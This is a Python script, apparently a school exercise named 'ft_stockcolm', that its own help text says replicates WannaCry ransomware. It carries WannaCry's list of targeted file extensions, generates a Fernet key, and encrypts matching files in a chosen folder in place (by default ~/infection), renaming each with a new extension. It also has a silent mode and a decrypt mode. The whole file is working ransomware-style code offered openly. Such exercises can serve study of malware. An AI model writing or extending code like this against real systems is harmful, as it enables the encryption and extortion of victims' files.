import os
import sys
import argparse
from pathlib import Path
from cryptography.fernet import Fernet



exts_wanacry = [
    ".123", ".3dm", ".3ds", ".3g2", ".3gp", ".602", ".7z", ".ARC", ".PAQ", ".accdb", 
    ".aes", ".ai", ".asc", ".asf", ".asm", ".asp", ".avi", ".backup", ".bak", ".bat", 
    ".bmp", ".brd", ".bz2", ".cgm", ".class", ".cmd", ".cpp", ".crt", ".cs", ".csr", 
    ".csv", ".db", ".dbf", ".dch", ".der", ".dif", ".dip", ".djv", ".djvu", ".doc", 
    ".docb", ".docm", ".docx", ".dot", ".dotm", ".dotx", ".fla", ".flv", ".frm", ".gif", 
    ".gpg", ".hwp", ".ibd", ".jar", ".java", ".jpeg", ".jpg", ".key", ".lay", ".lay6", 
    ".ldf", ".m3u", ".m4u", ".max", ".mdb", ".mdf", ".mid", ".mkv", ".mml", ".mov", 
    ".mp3", ".mp4", ".mpeg", ".mpg", ".ms11", ".myd", ".myi", ".nef", ".odb", ".odg", 
    ".odp", ".ods", ".odt", ".otg", ".otp", ".ots", ".ott", ".p12", ".paq", ".pas", 
    ".pdf", ".pem", ".pfx", ".php", ".pl", ".png", ".pot", ".potm", ".potx", ".ppam", 
    ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx", ".psd", ".rar", ".raw", ".rtf", 
    ".sch", ".sh", ".slk", ".sql", ".sqlite3", ".sqlitedb", ".stc", ".std", ".sti", 
    ".stw", ".svg", ".swf", ".sxc", ".sxd", ".sxi", ".sxm", ".sxw", ".tar", ".tbk", 
    ".tgz", ".tif", ".tiff", ".txt", ".uop", ".uot", ".vb", ".vbs", ".vcd", ".vdi", 
    ".vmdk", ".vmx", ".vob", ".wav", ".wb2", ".wk1", ".wks", ".wma", ".wmv", ".xlc", 
    ".xlm", ".xls", ".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".zip"
]
DEFAULT_DIR = str(Path.home()) + "/infection"

def parse_args():
    """ 
        Inicializa el parser y los parámetros necesarios.
        returns parser: un objeto ArgumentParser
    """
    parser = argparse.ArgumentParser(
        description='Replicate a wanacry malware in style 42')
    parser.add_argument('-v', '--version', action='store_true', help='Show the version of the program')
    parser.add_argument('-r', '--reverse', metavar="keyfile", help='Decrypt files with keyfile', type=str)
    parser.add_argument('-s', '--silent', action='store_true', help='Run in silent mode')
    parser.add_argument('-e', '--ext', default='.ft', help='Rename files with extension')
    parser.add_argument('-p', '--path', default=DEFAULT_DIR, help='Folder to encrypt/decrypt files')
    return parser.parse_args()

def generate_key():
    """
        Genera una clave para encriptar los archivos
        returns key: un objeto Fernet
    """
    key = Fernet.generate_key()
    with open('key_file.key', 'wb') as filekey:
        filekey.write(key)



def encrypt_file(input_file, ext, key_file, silent):
    try:
        with open(key_file, 'rb') as file:
            data = file.read()
        serial = Fernet(data)
    except FileNotFoundError:
        print('Key file not found')
        exit()
    with open(input_file, "rb") as file:
        file_data = file.read()
        encrypted_data = serial.encrypt(file_data)
    with open(input_file, "wb") as file:
        file.write(encrypted_data)
    os.rename(input_file, input_file + ext)
    if not silent:
        print('File {} encrypted'.format(input_file))


def decrypt_file(input_file, ext, key_file, silent):
    try:
        with open(key_file, 'rb') as file:
            key = file.read()  
        f = Fernet(key)  
    except FileNotFoundError:
        print('Key file not found or other')
        exit()
    except Exception as e:
        print(f"Error: {e}")
        return
    with open(input_file, 'rb') as file:
        encrypted_data = file.read()
    try:
        data = f.decrypt(encrypted_data)  
    except Exception as e:
        if not silent:
            print(f"Error decrypting file {input_file}: {e}")
        return
    with open(input_file, "wb") as file:
        file.write(data)
    os.rename(input_file, input_file[:-len(ext)])
    if not silent:
        print('File {} decrypted'.format(input_file))


def version():
    print('ft_stockcolm version JLE 0.1.0.')

def main():

    args = parse_args()
    silent = args.silent
    ext = args.ext
    path = args.path
    key = args.reverse
    if args.version:
        version()
        return
    elif args.reverse:
        for file in os.listdir(path):
                if os.path.isfile(os.path.join(path, file)):
                    decrypt_file(os.path.join(path, file), ext, key, silent)
        if not silent:
            print('Process decrypted is finish')
    else:
        generate_key()
        for file in os.listdir(path):
            if os.path.splitext(file)[1] in exts_wanacry:
                encrypt_file(os.path.join(path, file), ext, 'key_file.key', silent)
            elif os.path.splitext(file)[1] not in exts_wanacry and not silent:
                print('File {} not encrypted'.format(file))
        if not silent:
            print('Files encrypted and generated keyfile named key_file.key')


    
if __name__ == '__main__':
    main()